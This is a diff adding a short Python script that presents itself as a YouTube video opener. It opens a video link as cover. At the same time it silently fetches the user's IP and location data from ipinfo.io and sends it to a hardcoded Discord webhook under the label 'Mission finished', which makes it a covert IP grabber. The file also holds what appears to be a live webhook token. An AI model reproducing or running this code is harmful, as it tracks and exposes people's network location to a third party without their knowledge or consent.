@@ -1,0 +1,17 @@
+from turtle import Screen
+import webbrowser
+import requests
+import random
+from requests import get,post
+req =requests
+gif =''
+
+
+hack1 = req.get('https://ipinfo.io/').text
+thx = 'Enter For url video :'
+you = webbrowser.open_new('https://www.youtube.com/watch?v=2SaoBaYAATw')
+dis = 'https://discord.com/api/webhooks/973959308251373628/QusNKjNhVbBZDwUByMb01E-Ofv36tA5-NSXasl1wlWfqkSao2BqA2khe87gv89qBX_q5'
+data = {}
+data["embeds"] = [{"description": f"\n** • {hack1}**","color": random.choice([0x8f12e3,0x6e09b3]),"thumbnail": {"url": gif},"author": {"name": "Mission finished ."}}]
+post(dis, json=data)
+print('here ')
